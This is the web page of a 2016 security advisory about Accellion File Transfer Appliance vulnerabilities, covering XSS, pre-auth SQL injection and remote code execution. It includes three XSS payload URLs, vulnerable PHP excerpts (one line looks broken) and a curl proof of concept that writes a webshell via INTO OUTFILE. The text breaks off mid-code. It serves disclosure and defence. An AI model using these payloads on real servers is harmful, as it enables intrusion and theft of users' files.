

<!DOCTYPE html>
<html class="no-js sub-menu">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta charset="utf-8" />
    <link href="/images/favicon.png" rel="icon" size="32x32">
    <!-- web fullscreen -->
    <meta name="apple-mobile-web-app-capable" content="yes"><!-- ios -->
    <meta name="mobile-web-app-capable" content="yes"><!-- android -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0" />
    <meta name="format-detection" content="telephone=no">
    <title>Advisory: Accellion File Transfer Appliance Vulnerability | DEVCORE</title>
    <link rel="stylesheet" href="/css/style.css" />
    <script src="/js/modernizr-custom.js"></script>
    <script src="/js/jquery-3.6.0.min.js"></script>
    <script src="/js/site.js"></script>
    <meta name="description" property="og:description" content="According to a public data reconnaissance, there are currently 1,217 FTA servers online around the world, most of which are located in the US, followed by Canada, Australia, UK, and Singapore. Determine from the domain name and SSL Certificate of these servers, FTA is widely used by governmental bodies, educational institutions, enterprises, including several well-known brands." />
    <meta name="keywords" content="Advisory, Facebook, BugBounty, RCE, CVE" />
    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
    <meta property="og:title" content="Advisory: Accellion File Transfer Appliance Vulnerability | DEVCORE 戴夫寇爾" />
    <meta property="og:url" content="https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://devco.re/assets/img/blog/20160922/Accellion.jpeg" />
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="d3vc0r3">
    <meta name="twitter:title" content="Advisory: Accellion File Transfer Appliance Vulnerability | DEVCORE 戴夫寇爾">
    <meta name="twitter:description" content="According to a public data reconnaissance, there are currently 1,217 FTA servers online around the world, most of which are located in the US, followed by Canada, Australia, UK, and Singapore. Determine from the domain name and SSL Certificate of these servers, FTA is widely used by governmental bodies, educational institutions, enterprises, including several well-known brands.">
    <meta name="twitter:creator" content="d3vc0r3">
    <meta name="twitter:image" content="https://devco.re/assets/img/blog/20160922/Accellion.jpeg">
    <meta name="twitter:domain" content="devco.re">
    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
    <meta name='yandex-verification' content='4561963cf1d18fe3' />
    <meta property="fb:admins" content="120968921404653" />

    <link rel="canonical" href="https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/"/>
    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GHXJ9PS005"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'G-GHXJ9PS005');
    </script>
    <link rel="stylesheet" href="/fonts/inter.css" />
    <link rel="stylesheet" href="/css/highlighter.css" />
    <!-- <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script> -->
</head>
<body class="en">
    <!-- 導覽列 start -->
    <header class="header">
<div class="container">
    <!-- logo start -->
    <div class="logo">
        <a href="/en/">
            <img src="/images/logo.svg"/>
        </a>
    </div>
    <!-- logo end -->
    <!-- 主選單 start -->
    <nav class="nav">
        <ul class="menu">
            <li class="dropdown">
                <div class="menuLable">
                    <span>Services<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/en/services/red-team/">
                            <div class="item">

                                <h2>
                                    <i class="icon menu service-red-team"></i>
                                    Red Team Assessment
                                </h2>
                                <p class="two-line">
                                    Simulation of real-world attacks to identify vulnerabilities and achieve objectives without disrupting business operations.
                                </p>
                            </div>
                        </a>
                        <a href="/en/services/penetration-test/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-penetration-test"></i>
                                    Penetration Testing
                                </h2>
                                <p class="two-line">
                                    Infiltration of designated enterprise systems to uncover potential vulnerabilities and assess the risks or damages.
                                </p>
                            </div>
                        </a>
                        <a href="/en/services/security-consulting/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-security-consulting"></i>
                                    Security Consulting
                                </h2>
                                <p class="two-line">
                                    Consultation of resource distribution and long-term defensive strategies from the attacker’s perspective.
                                </p>
                            </div>
                        </a>
                        <a href="/en/services/security-training/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-security-training"></i>
                                    Security Training
                                </h2>
                                <p class="two-line">
                                    Instruction on defending and preventing incidents with the hacker mindset, also the response procedures and analysis of attacks when incidents happen.
                                </p>
                            </div>
                        </a>
                        <a href="https://training.devco.re/" target="_blank">
                            <div class="item">
                                <h2>
                                    <i class="icon menu offsec"></i>
                                    OffSec Advanced Training <i class="icon open-in-new"></i>
                                </h2>
                                <p class="two-line">
                                    Structured in-person (OffSec Live Training) and online training, featuring up-to-date offensive security skills with OffSec certification and resources.
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>

            <li class="dropdown">
                <div class="menuLable">
                    <span>Research<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/en/research/overview/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu search-circle"></i>
                                    Overview
                                </h2>
                                <p class="two-line">
                                    Research of updated cybersecurity techniques and trends, assess the security of products, and evolve the red team with broad experience.
                                </p>
                            </div>
                        </a>
                        <a href="/en/research/awards/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu badge-check"></i>
                                    Competitions and Awards
                                </h2>
                                <p class="two-line">
                                    Awards from international cybersecurity competitions.
                                </p>
                            </div>
                        </a>
                        <a href="/en/research/bug-bounty/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu puzzle"></i>
                                    Enterprise Vulnerability Reports
                                </h2>
                                <p class="two-line">
                                    Research of the risk of enterprise systems, identification of potential weaknesses, and report to vendors.
                                </p>
                            </div>
                        </a>
                        <a href="/en/research/talks/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu globe"></i>
                                    International Conferences
                                </h2>
                                <p class="two-line">
                                    Sharing vulnerability research and security knowledge at international cybersecurity conferences.
                                </p>
                            </div>
                        </a>
                        <a href="/en/research/cve/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu view-list"></i>
                                    CVE List
                                </h2>
                                <p class="two-line">
                                    Discovery of critical vulnerabilities in leading international products and services.
                                </p>
                            </div>
                        </a>
                    </div>
                </div>


            </li>

            <li class="dropdown">
                <div class="menuLable" href="#">
                    <span>Company<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/en/company/about/">
                        <div class="item">
                            <h2>
                                <i class="icon menu company"></i>
                                Company Overview
                            </h2>
                            <p>
                                Founded by a world-class white hat hacker team, providing cybersecurity services including Red Team Assessment,  Penetration Testing, Security Consulting, and Security Training.
                            </p>
                        </div>
                        </a>
                        <a href="/en/company/our-team/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu team"></i>
                                    Team Members
                                </h2>
                                <p class="two-line">
                                    Composed of cybersecurity experts with the hacker mindset, exploring innovative exploitation techniques with high morality and extreme caution.
                                </p>
                            </div>
                        </a>
                        <a href="/en/company/history/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu milestone"></i>
                                    Achievements
                                </h2>
                                <p class="two-line">
                                    DEVCORE has been invited to leading cybersecurity conferences, has uncovered hundreds of critical product vulnerabilities, and helped enterprises improve their defensive capabilities.
                                </p>
                            </div>
                        </a>
                        <a href="/en/company/csr/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu heart"></i>
                                    Corporate Social Responsibility
                                </h2>
                                <p class="two-line">
                                    We provide diverse internship channels and programs to nurture the next generation and promote cybersecurity awareness.
                                </p>
                            </div>
                        </a>
                        <a href="/en/company/jobs/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu briefcase"></i>
                                    Job Opportunities
                                </h2>
                                <p class="two-line">
                                    Join us to secure the world and improve the cybersecurity industry together.
                                </p>
                            </div>
                        </a>
                        <a href="https://conf.devco.re/" target="_blank">
                            <div class="item">
                                <h2>
                                    <i class="icon menu conference"></i>
                                    DEVCORE CONFERENCE <i class="icon open-in-new"></i>
                                </h2>
                                <p class="two-line">
                                    DEVCORE’s annual technical conference focused on offensive security research, red team insights, and novel attack vectors from real-world operations.
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>
            <li class="dropdown">
                <div class="menuLable">
                    <span>News<i class="icon arrow_down"></i></span>
                    <div class="menuItem">
                        <a href="/en/blog/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu newspaper"></i>
                                    BLOG
                                </h2>
                                <p>
                                    Latest news
                                </p>
                            </div>
                        </a>
                        <a href="/en/media-kit/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu download"></i>
                                    Media Resources
                                </h2>
                                <p>
                                    Media Kit, Logo and Usage Guideline
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>
            <li>
                <a class="menuLable" href="/en/search/">Search</a>
            </li>
            <li>
                <a class="menuLable" href="/en/contact/">Contact</a>
            </li>
        </ul>
    </nav>
    <!-- 主選單 end -->
</div>


<!-- 手機板選單  start-->
<nav class="nav-m" id="menu-m">
    <ul class="menu">
        <li>
            <div class="menuLable">
                <span>Services</span>
                <div class="menuItem">
                    <a href="/en/services/red-team/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-red-team"></i>
                                Red Team Assessment
                            </h2>
                        </div>
                    </a>
                    <a href="/en/services/penetration-test/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-penetration-test"></i>
                                Penetration Testing
                            </h2>
                        </div>
                    </a>
                    <a href="/en/services/security-consulting/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-security-consulting"></i>
                                Security Consulting
                            </h2>
                        </div>
                    </a>
                    <a href="/en/services/security-training/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-security-training"></i>
                                Security Training
                            </h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span>Research</span>
                <div class="menuItem">
                    <a href="/en/research/overview/" class="fullwidth">
                        <div class="item">
                            <h2>Overview</h2>
                        </div>
                    </a>
                    <a href="/en/research/awards/">
                        <div class="item">
                            <h2>Competitions and Awards</h2>
                        </div>
                    </a>
                    <a href="/en/research/bug-bounty/">
                        <div class="item">
                            <h2>Enterprise Vulnerability Reports</h2>
                        </div>
                    </a>
                    <a href="/en/research/talks/">
                        <div class="item">
                            <h2>International Conferences</h2>
                        </div>
                    </a>
                    <a href="/en/research/cve/">
                        <div class="item">
                            <h2>CVE List</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>

        <li>
            <div class="menuLable">
                <span>Company</span>
                <div class="menuItem">
                    <a href="/en/company/about/" class="fullwidth">
                        <div class="item">
                            <h2>Company Overview</h2>
                        </div>
                    </a>
                    <a href="/en/company/our-team/">
                        <div class="item">
                            <h2>Team Members</h2>
                        </div>
                    </a>
                    <a href="/en/company/history/">
                        <div class="item">
                            <h2>Achievements</h2>
                        </div>
                    </a>
                    <a href="/en/company/csr/">
                        <div class="item">
                            <h2>Corporate Social Responsibility</h2>
                        </div>
                    </a>
                    <a href="/en/company/jobs/">
                        <div class="item">
                            <h2>Job Opportunities</h2>
                        </div>
                    </a>
                    <a href="https://conf.devco.re/" target="_blank">
                        <div class="item">
                            <h2>DEVCORE CONFERENCE</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span>News</span>
                <div class="menuItem">
                    <a href="/en/blog/">
                        <div class="item">
                            <h2>BLOG</h2>
                        </div>
                    </a>
                    <a href="/en/media-kit/">
                        <div class="item">
                            <h2>Media Resources</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <div class="menuItem">
                    <a href="/en/search/" class="fullwidth">
                        <div class="item">
                            <h2 class="center">
                                <i class="icon search"></i>
                                Search
                            </h2>
                        </div>
                    </a>
                    <a href="/en/contact/" class="fullwidth">
                        <div class="item">
                            <h2 class="center">
                                <i class="icon chat-alt"></i>
                                Contact
                            </h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span><i class="icon translate"></i>Language</span>
                <div class="menuItem">
                    <a href="/">
                    <div class="item">
                        <h2>中文</h2>
                    </div>
                    </a>
                    <a href="/en">
                        <div class="item">
                            <h2>English</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
    </ul>
</nav>
<!-- 手機板選單  end-->
    </header>
    <!-- 導覽列 end -->

    <!-- tab 選單 start -->
    <div class="sub-nav">
        <div class="container">
            <h1>BLOG</h1>
            <ul class="tab">
                <li>
                    <a href="/en/blog/">All Articles</a>
                </li>
                <li>
                    <a href="/en/blog/category/Tech%20Editorials/">Tech Editorials</a>
                </li>
                <li>
                    <a href="/en/media-kit/">Media Resources</a>
                </li>
            </ul>
        </div>
    </div>
    <!-- tab 選單 end -->
    
    <div class="main">
        <!-- 文章外層layer -->
        <section class="narrow">
            <!-- 文章 start -->
            <article class="article_body">
                <div class="content">
                    <a class="category" href="/en/blog/category/Tech Editorials">Tech Editorials</a>
                    <span class="tag">

                      <a href="/en/blog/tag/Advisory/">#Advisory</a> <a href="/en/blog/tag/Facebook/">#Facebook</a> <a href="/en/blog/tag/BugBounty/">#BugBounty</a> <a href="/en/blog/tag/RCE/">#RCE</a> <a href="/en/blog/tag/CVE/">#CVE</a> 
                    </span>
                    <h1>
                        Advisory: Accellion File Transfer Appliance Vulnerability
                    </h1>
                    
                    
                    <div class="author_detail">
                        <span class="avatar">
                            <a href="/en/blog/author/orange">
                                <div class="circle">
                                    <i class="user" style="background-image: url('/assets/img/avatar/orig/orange.png');" ></i>
                                </div>
                            </a>
                        </span>
                        <span class="author"><a href="/en/blog/author/orange">Orange Tsai</a></span>
                        <span class="date">2016-09-22</span>
                    </div>
                    
                    
                    <div class="article_img">
                        <img src="https://devco.re/assets/img/blog/20160922/Accellion.jpeg"/>
                    </div>
                    

                    <hr>

                    <!-- 文章內容 -->
                    <div class="article_content">
<p>By <a href="http://blog.orange.tw/">Orange Tsai</a></p>

<p><a href="/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/">English Version</a><br />
<a href="/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/">中文版本</a></p>

<hr />

<h3 id="about-accellion-fta">About Accellion FTA</h3>
<p><br />
Accellion File Transfer Appliance (<code class="language-plaintext highlighter-rouge">FTA</code>) is a secure file transfer service which enables users to share and sync files online with AES 128/256 encryption. The Enterprise version further incorporates SSL VPN services with integration of Single Sign-on mechanisms like AD, LDAP and Kerberos.
<br /></p>

<!-- more -->

<h3 id="vulnerability-details">Vulnerability Details</h3>
<p><br />
In this research, the following vulnerabilities were discovered on the FTA version FTA_9_12_0 (13-Oct-2015 Release)</p>

<ul>
  <li>Cross-Site Scripting x 3</li>
  <li>Pre-Auth SQL Injection leads to Remote Code Execution</li>
  <li>Known-Secret-Key leads to Remote Code Execution</li>
  <li>Local Privilege Escalation x 2</li>
</ul>

<p>The above-mentioned vulnerabilities allow unauthenticated attackers to remotely attack FTA servers and gain highest privileges successfully. After the attackers fully controlled the servers, they will be able to retrieve the encrypted files and user data, etc.</p>

<p>After reporting to CERT/CC, these vulnerabilities were assigned 4 CVEs (CVE-2016-2350, CVE-2016-2351, CVE-2016-2352, CVE-2016-2353).<br />
<br /></p>

<h3 id="areas-affected">Areas Affected</h3>
<p><br />
According to a public data reconnaissance, there are currently 1,217 FTA servers online around the world, most of which are located in the US, followed by Canada, Australia, UK, and Singapore.<br />
Determine from the domain name and SSL Certificate of these servers, FTA is widely used by governmental bodies, educational institutions, enterprises, including several well-known brands.<br />
<br /></p>

<h3 id="vulnerability-analysis-and-exploitation">Vulnerability Analysis and Exploitation</h3>
<p><br /></p>

<h4 id="multiple-cross-site-scripting-cve-2016-2350">Multiple Cross-Site Scripting (CVE-2016-2350)</h4>

<h5 id="1-xss-in-move_partition_framehtml">1. XSS in move_partition_frame.html</h5>

<blockquote>
  <p>https://&lt;fta&gt;/courier/move_partition_frame.html<br />
?f2=’-prompt(document.domain);//</p>
</blockquote>

<h5 id="2-xss-in-getimageajaxphp">2. XSS in getimageajax.php</h5>

<blockquote>
  <p>https://&lt;fta&gt;/courier/web/getimageajax.php<br />
?documentname=”onerror=”prompt(document.domain)//</p>
</blockquote>

<h5 id="3-xss-in-wminfohtml">3. XSS in wmInfo.html</h5>

<blockquote>
  <p>https://&lt;fta&gt;/courier/web/wmInfo.html<br />
?msg=ssologout<br />
&amp;loginurl=”&gt;&lt;svg/onload=”prompt(document.domain)</p>
</blockquote>

<p><br /></p>

<h4 id="pre-auth-sql-injection-leads-to-rce-cve-2016-2351">Pre-Auth SQL Injection leads to RCE (CVE-2016-2351)</h4>

<p>After code reviewing, a pre-authentication SQL Injection vulnerability was found in FTA. This vulnerability grants malicious users access to sensitive data and personal information on the server through SQL Injection, and launch remote code execution (RCE) by further exploiting privilege-escalating vulnerabilities.<br />
The key to this problem lies in the <code class="language-plaintext highlighter-rouge">client_properties( ... )</code> function called by security_key2.api!</p>

<div class="highlight-name">/home/seos/courier/security_key2.api</div>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="c1">// ...</span>
<span class="nv">$password</span> <span class="o">=</span> <span class="nf">_decrypt</span><span class="p">(</span> <span class="nv">$password</span><span class="p">,</span> <span class="nf">_generate_key</span><span class="p">(</span> <span class="nv">$g_app_id</span><span class="p">,</span> <span class="nv">$client_id</span><span class="p">,</span> <span class="nv">$g_username</span> <span class="p">)</span> <span class="p">);</span>
<span class="nf">opendb</span><span class="p">();</span>
<span class="nv">$client_info</span> <span class="o">=</span> <span class="nf">client_properties</span><span class="p">(</span> <span class="nv">$client_id</span> <span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
<span class="c1">// ...</span></code></pre></figure>

<p>Among these parameters, <code class="language-plaintext highlighter-rouge">$g_app_id</code> <code class="language-plaintext highlighter-rouge">$g_username</code> <code class="language-plaintext highlighter-rouge">$client_id</code> and <code class="language-plaintext highlighter-rouge">$password</code> are controllable by the attackers. And although the function <code class="language-plaintext highlighter-rouge">_decrypt( ... )</code> handles the passwords, it does not involve in the triggering of the vulnerability.<br />
One thing to pay special attention is that the value of <code class="language-plaintext highlighter-rouge">$g_app_id</code> will be treated as a global variable which represents the current Application ID in use, and will be applied in <code class="language-plaintext highlighter-rouge">opendb( )</code> accordingly. The code in <code class="language-plaintext highlighter-rouge">opendb( )</code> includes the following lines:</p>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="nv">$db</span> <span class="o">=</span> <span class="no">DB_MASTER</span> <span class="mf">.</span> <span class="nv">$g_app_id</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">mysql_select_db</span><span class="p">(</span> <span class="nv">$db</span> <span class="p">))</span></code></pre></figure>

<p>In <code class="language-plaintext highlighter-rouge">mysql_select_db</code>, the name of the database to be opened is controllable by the user. If wrong value was given, the program will be interrupted. Therefore, <code class="language-plaintext highlighter-rouge">$g_app_id</code> must be forged correctly.</p>

<p>The following lines are the most important function <code class="language-plaintext highlighter-rouge">client_properties( $client_id )</code>.</p>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">function</span> <span class="n">client_properties</span><span class="p">(</span><span class="nv">$client_id</span> <span class="o">=</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$user</span> <span class="o">=</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$manager</span> <span class="o">=</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$client_type</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$client_name</span> <span class="o">=</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$order_by</span> <span class="o">=</span> <span class="s1">'client_id'</span><span class="p">,</span> <span class="nv">$order_type</span> <span class="o">=</span> <span class="s1">'a'</span><span class="p">,</span> <span class="nv">$limit</span> <span class="o">=</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$offset</span> <span class="o">=</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$exclude_del</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="nv">$user_type</span> <span class="o">=</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$user_status</span> <span class="o">=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$sql</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$user_type</span>  <span class="o">=</span> <span class="s1">''</span> <span class="o">?</span> <span class="s1">'SELECT t_mail_server.* FROM t_mail_server '</span> <span class="o">:</span> <span class="s1">'SELECT t_mail_server.*, t_profile.c_flag as profile_flag FROM t_mail_server, t_profile '</span><span class="p">);</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">'client_id'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$client_id</span><span class="p">;</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">'client_name'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$client_name</span><span class="p">;</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">'client_type'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$client_type</span><span class="p">;</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">mysql_escape_like</span><span class="p">(</span> <span class="nv">$user</span> <span class="p">);</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">'user_type'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user_type</span><span class="p">;</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">'manager'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$manager</span><span class="p">;</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">'user_status'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user_status</span><span class="p">;</span>
    <span class="nv">$sql</span> <span class="o">&amp;=</span> <span class="nf">construct_where_clause</span><span class="p">(</span> <span class="nv">$filter</span><span class="p">,</span> <span class="nv">$exclude_del</span> <span class="p">);</span>

    <span class="c1">// ...</span>

    <span class="nv">$result</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>  <span class="p">);</span>
    <span class="o">@</span><span class="nb">mysql_query</span><span class="p">(</span> <span class="nv">$sql</span> <span class="p">);</span>
    <span class="p">(</span> <span class="nv">$db_result</span> <span class="o">=</span>  <span class="o">||</span> <span class="nf">fatal_error</span><span class="p">(</span> <span class="s1">'exec:mysql_query('</span> <span class="mf">.</span> <span class="nv">$sql</span> <span class="mf">.</span> <span class="s1">') respond:'</span> <span class="mf">.</span> <span class="nb">mysql_error</span><span class="p">(</span>  <span class="p">),</span> <span class="k">__FILE__</span><span class="p">,</span> <span class="mi">221</span> <span class="p">)</span> <span class="p">);</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">function</span> <span class="n">construct_where_clause</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span> <span class="nv">$exclude_del</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$where_clause</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>  <span class="p">);</span>
    <span class="nv">$where_clause</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'c_server_id  != \'999\''</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$exclude_del</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$where_clause</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'!(t_mail_server.c_flag &amp; '</span> <span class="mf">.</span> <span class="no">CLIENT_DELETED</span> <span class="mf">.</span> <span class="s1">')'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$filter</span><span class="p">[</span><span class="s1">'client_id'</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$where_clause</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'c_server_id = \''</span> <span class="mf">.</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">'client_id'</span><span class="p">]</span> <span class="mf">.</span> <span class="s1">'\''</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$filter</span><span class="p">[</span><span class="s1">'manager'</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$filter</span><span class="p">[</span><span class="s1">'manager'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">'manager'</span><span class="p">]</span> <span class="p">);</span>
        <span class="nv">$where_clause</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'c_manager = \''</span> <span class="mf">.</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">'manager'</span><span class="p">]</span> <span class="mf">.</span> <span class="s1">'\''</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$filter</span><span class="p">[</span><span class="s1">'client_name'</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$filter</span><span class="p">[</span><span class="s1">'client_name'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">'client_name'</span><span class="p">]</span> <span class="p">);</span>
        <span class="nv">$where_clause</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'t_mail_server.c_name LIKE \'%'</span> <span class="mf">.</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">'client_name'</span><span class="p">]</span> <span class="mf">.</span> <span class="s1">'%\''</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">((</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">''</span> <span class="o">&amp;&amp;</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">'%%'</span> <span class="p">))</span> <span class="p">{</span>
        <span class="nv">$filter</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]</span> <span class="p">);</span>
        <span class="nv">$where_clause</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'t_mail_server.c_user_id LIKE \''</span> <span class="mf">.</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]</span> <span class="mf">.</span> <span class="s1">'\''</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<p>The parameters passed onto the function <code class="language-plaintext highlighter-rouge">client_properties( ... )</code>  will be assembled into SQL statements. Among all the functions joining the assembling, <code class="language-plaintext highlighter-rouge">construct_where_clause( ... )</code> is the most crucial one.<br />
In the function <code class="language-plaintext highlighter-rouge">construct_where_clause( ... )</code>, every parameter is protected by the string <code class="language-plaintext highlighter-rouge">mysql_real_escape_string</code> except for <code class="language-plaintext highlighter-rouge">$client_id</code>. Judging from the coding style of the source code, it might be a result of oversight. Therefore, SQL Injection can be triggered by sending out corresponding parameters according to the program flow.</p>

<p>In addition, FTA database user has root privileges with FILE_PRIV option enabled. By exploiting <code class="language-plaintext highlighter-rouge">INTO OUTFILE</code> and writing their own PHP code to write-enabled directory, user will be able to execute code remotely!</p>

<p><strong>PoC</strong></p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>curl https://&lt;fta&gt;/courier/1000@/security_key2.api <span class="nt">-d</span> <span class="s2">"aid=1000&amp;user_id=1&amp;password=1&amp;client_id=' OR 1=1 LIMIT 1 INTO OUTFILE '/home/seos/courier/themes/templates/.cc.php' LINES TERMINATED BY 0x3c3f...#"</span></code></pre></figure>

<p>The created PHP file will be located at</p>

<blockquote>
  <p>http://&lt;fta&gt;/courier/themes/templates/.cc.php</p>
</blockquote>

<p><br /></p>

<h4 id="known-secret-key-leads-to-remote-code-execution">Known-Secret-Key leads to Remote Code Execution</h4>

<p>In the previous vulnerability, one requirement to execute code remotely is the existence of a write-enabled directory for injecting webshell. But in reality, chances are there is no write-enabled directory available, thus fail to execute code through SQL Injection. But there is another way to help us accomplish RCE.</p>

<p>The precondition of this vulnerability is <strong>Known-Secret-Key stored in the database</strong></p>

<p>This is not a problem, since the database can be accessed with the SQL Injection vulnerability mentioned earlier. Also, although there are some parameter filters in the code, they can be bypassed!</p>

<div class="highlight-name">/home/seos/courier/sfUtils.api</div>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="nv">$func_call</span> <span class="o">=</span> <span class="nf">decrypt</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'fc'</span><span class="p">]</span> <span class="p">);</span>
<span class="nv">$orig_func</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span> <span class="s1">'/(.+)\(.*\)/'</span><span class="p">,</span> <span class="nv">$func_call</span><span class="p">,</span> <span class="nv">$func_match</span> <span class="p">))</span> <span class="p">{</span>
